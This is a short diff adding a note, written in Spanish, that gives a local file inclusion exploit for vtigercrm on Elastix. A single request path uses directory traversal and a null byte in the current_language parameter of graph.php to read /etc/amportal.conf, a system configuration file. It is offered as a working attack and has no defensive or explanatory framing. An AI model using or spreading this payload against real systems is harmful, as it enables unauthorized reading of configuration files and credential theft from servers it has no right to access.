@@ -1,0 +1,3 @@
+#Este LFI funciona en elastix
+
+#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
